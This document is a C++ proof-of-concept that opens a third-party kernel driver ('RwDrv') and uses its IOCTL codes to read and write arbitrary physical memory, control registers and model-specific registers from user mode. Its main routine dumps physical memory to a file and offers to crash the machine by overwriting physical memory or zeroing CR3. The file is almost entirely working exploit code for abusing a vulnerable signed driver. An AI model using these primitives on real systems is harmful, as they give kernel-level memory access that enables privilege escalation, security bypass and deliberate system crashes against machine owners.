#include <windows.h>
#include <fstream>

struct PhysRW_t
{
	uint64_t PhysicalAddress;
	DWORD Size;
	DWORD Unknown;
	uint64_t Address;
};

struct RegRW_t
{
	DWORD Register;
	uint64_t Value;
};

struct MSRRW_t
{
	DWORD Low;
	DWORD Unknown;
	DWORD Register;
	DWORD High;
};

#define LAST_IND(x,part_type)    (sizeof(x)/sizeof(part_type) - 1)
#define HIGH_IND(x,part_type)  LAST_IND(x,part_type)
#define LOW_IND(x,part_type)   0
#define DWORDn(x, n)  (*((DWORD*)&(x)+n))
#define HIDWORD(x) DWORDn(x,HIGH_IND(x,DWORD))
#define __PAIR64__(high, low)   (((uint64_t) (high) << 32) | (uint32_t)(low))


class RwDrv
{
public:
	RwDrv()
	{
		h = CreateFileA("\\\\.\\RwDrv", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (h == INVALID_HANDLE_VALUE)
		{
			printf("Driver Not Loaded!\n");
			Sleep(3000);
			exit(0);
		}
	}

	~RwDrv()
	{
		CloseHandle(h);
	}

	void PhysicalRead(uint64_t Address, uint64_t* Address2, DWORD Size)
	{
		PhysRW_t A;

		A.PhysicalAddress = Address;
		A.Address = (uint64_t)Address2;
		A.Unknown = 0;
		A.Size = Size;

		DeviceIoControl(h, 0x222808, &A, sizeof(A), &A, sizeof(A), 0, 0);
	}

	void PhysicalWrite(uint64_t Address, uint64_t* Address2, DWORD Size)
	{
		PhysRW_t A;

		A.PhysicalAddress = Address;
		A.Address = (uint64_t)Address2;
		A.Unknown = 0;
		A.Size = Size;

		DeviceIoControl(h, 0x22280C, &A, sizeof(A), 0, 0, 0, 0);
	}

	// CR0: 0, CR2: 2, CR3: 3, CR4: 4, IRQL: 8
	void ReadControlRegister(int Register, uint64_t* Value)
	{
		RegRW_t A;

		A.Register = Register;
		A.Value = 0;

		DeviceIoControl(h, 0x22286C, &A, sizeof(A), &A, sizeof(A), 0, 0);
		*Value = A.Value;
	}

	// CR0: 0, CR3: 3, CR4: 4, CR8: 8
	// Keep in mind that this function does NOT disable interrupts, meaning writing for example cr0 will result in a bsod.
	void WriteControlRegister(int Register, uint64_t Value)
	{
		RegRW_t A;

		A.Register = Register;
		A.Value = (uint64_t)&Value;

		DeviceIoControl(h, 0x222870, &A, sizeof(A), &A, sizeof(A), 0, 0);
	}

	// Read and write msr is very wierd in this driver, it splits the lower and higher bits of the value in the struct.
	void ReadMSR(int Register, uint64_t* Value)
	{
		MSRRW_t A;
		A.Register = Register;
		A.Low = 0;
		A.High = 0;

		DeviceIoControl(h, 0x222874, &A, sizeof(A), &A, sizeof(A), 0, 0);

		*Value = __PAIR64__(A.High, A.Low);
	}

	void WriteMSR(int Register, uint64_t Value)
	{
		MSRRW_t A;
		A.Register = Register;
		A.Low = *(DWORD*)&Value;
		A.High = HIDWORD(Value);

		DeviceIoControl(h, 0x22284C, &A, sizeof(A), &A, sizeof(A), 0, 0);
	}

private:
	HANDLE h;
};


void WriteFileToDisk(const char* FileName, uint64_t Buffer, DWORD Size)
{
	std::ofstream File(FileName, std::ios::binary);
	File.write((char*)Buffer, Size);
	File.close();
}

int main()
{
	RwDrv* Drv = new RwDrv();

	uint64_t CR0, CR2, CR3, CR4, IRQL;

	Drv->ReadControlRegister(0, &CR0);
	Drv->ReadControlRegister(2, &CR2);
	Drv->ReadControlRegister(3, &CR3);
	Drv->ReadControlRegister(4, &CR4);
	Drv->ReadControlRegister(8, &IRQL);

	printf("CR0: 0x%llx\n", CR0);
	printf("CR2: 0x%llx\n", CR2);
	printf("CR3: 0x%llx\n", CR3);
	printf("CR4: 0x%llx\n", CR4);
	printf("IRQL: 0x%llx\n", IRQL);

	DWORD SizeToDumpToDisk = 0xFFFF;
	uint64_t AllocatedTempMem = (uint64_t)VirtualAlloc(0, SizeToDumpToDisk, MEM_COMMIT, PAGE_READWRITE);

	// Read it in chunks of 8 bytes to save calls, you can read the entire page if you like to.
	for (int i = 0; i < (SizeToDumpToDisk / 8); i++)
		Drv->PhysicalRead(i * 8, (uint64_t*)(AllocatedTempMem + i * 8), 8);

	WriteFileToDisk("PhysMemDmp.bin", AllocatedTempMem, SizeToDumpToDisk);
	VirtualFree((void*)AllocatedTempMem, 0, MEM_RELEASE);


	int Ret = MessageBoxA(0, "Would you like to bsod via writing physical memory?", "Physical Memory Write Test", MB_ICONQUESTION | MB_YESNO);
	if (Ret == IDYES)
	{
		for (int i = 0; i < 0xFFFF; i++)
			Drv->PhysicalWrite(i * 4, (uint64_t*)&SizeToDumpToDisk, 4);
	}

	Ret = MessageBoxA(0, "Would you like to bsod via writing cr3?", "Control Register Write Test", MB_ICONQUESTION | MB_YESNO);
	if (Ret == IDYES)
		Drv->WriteControlRegister(3, 0);


	Sleep(-1);
}